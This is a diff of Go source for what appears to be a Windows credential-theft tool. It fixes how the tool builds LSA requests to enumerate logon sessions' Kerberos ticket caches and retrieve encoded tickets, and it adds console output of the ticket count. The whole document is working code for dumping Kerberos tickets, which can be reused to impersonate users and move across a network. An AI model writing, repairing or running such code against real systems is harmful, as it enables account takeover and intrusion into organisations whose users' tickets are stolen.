@@ -490,41 +490,37 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		return nil, fmt.Errorf("invalid LSA handle")
 	}
 
-	request := KerbRetrieveTktRequest{
-		MessageType:    KerbRetrieveEncodedTicketMessage,
-		LogonId:        luid,
-		TicketFlags:    0,
-		CacheOptions:   KerbRetrieveTicketAsKerbCred,
-		EncryptionType: 0,
-	}
+	// Convert target name to UTF16 and calculate sizes
+	targetNameUTF16 := windows.StringToUTF16(targetName)
+	nameLen := uint16(len(targetNameUTF16) * 2) // Length in bytes
 
-	utf16Bytes := windows.StringToUTF16(targetName)
-	length := uint16(len(targetName) * 2)
-	maxLength := length + 2
+	// Calculate total size needed for request
+	requestSize := unsafe.Sizeof(KerbRetrieveTktRequest{})
+	totalSize := requestSize + uintptr(nameLen)
 
-	structSize := unsafe.Sizeof(request)
-	totalSize := structSize + uintptr(maxLength)
-
+	// Allocate buffer for the entire request
 	buffer := make([]byte, totalSize)
 	bufferPtr := unsafe.Pointer(&buffer[0])
 
-	*(*KerbRetrieveTktRequest)(bufferPtr) = request
+	// Set up the request at the start of the buffer
+	request := (*KerbRetrieveTktRequest)(bufferPtr)
+	request.MessageType = KerbRetrieveEncodedTicketMessage
+	request.LogonId = luid
+	request.TicketFlags = 0
+	request.CacheOptions = KerbRetrieveTicketAsKerbCred
+	request.EncryptionType = 0
 
-	var targetNamePtr uintptr
-	targetNamePtrOffset := uintptr(24) // for 64-bit
-	if unsafe.Sizeof(uintptr(0)) == 4 {
-		targetNamePtrOffset = uintptr(16) // for 32-bit
-	}
-	*(*uintptr)(unsafe.Pointer(uintptr(bufferPtr) + targetNamePtrOffset)) = targetNamePtr
+	// Calculate where to put the target name string
+	targetNamePtr := uintptr(bufferPtr) + requestSize
 
-	targetNamePtr = uintptr(bufferPtr) + structSize
-	copy((*[1 << 30]byte)(unsafe.Pointer(targetNamePtr))[:maxLength],
-		unsafe.Slice((*byte)(unsafe.Pointer(&utf16Bytes[0])), maxLength))
+	// Copy the UTF16 string to the buffer
+	copy((*[1 << 30]byte)(unsafe.Pointer(targetNamePtr))[:nameLen],
+		unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen))
 
-	requestPtr := (*KerbRetrieveTktRequest)(bufferPtr)
-	requestPtr.TargetName = LsaString{
-		Length:        length,
-		MaximumLength: maxLength,
+	// Set up the LSA string structure to point to our target name
+	request.TargetName = LsaString{
+		Length:        nameLen - 2, // Subtract null terminator
+		MaximumLength: nameLen,
 		Buffer:        targetNamePtr,
 	}
 
@@ -620,6 +616,15 @@ func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCr
 			ticketCacheRequest.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
 		}
 
+		var padding uint32 = 0
+
+		// Create properly sized buffer for request
+		requestSize := unsafe.Sizeof(ticketCacheRequest) + unsafe.Sizeof(padding)
+		buffer := make([]byte, requestSize)
+
+		// Copy request into buffer
+		*(*KerbQueryTktCacheRequest)(unsafe.Pointer(&buffer[0])) = ticketCacheRequest
+
 		ret, _, err := LsaCallAuthenticationPackage.Call(
 			uintptr(lsaHandle),
 			uintptr(authPackage),
@@ -639,6 +644,7 @@ func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCr
 			response := (*QueryTktCacheResponse)(unsafe.Pointer(responsePtr))
 
 			if response.CountOfTickets > 0 {
+				fmt.Printf("[*] Found %d tickets in cache for session\n", response.CountOfTickets)
 				ticketSize := unsafe.Sizeof(KerbTicketCacheInfoEx{})
 
 				for i := uint32(0); i < response.CountOfTickets; i++ {
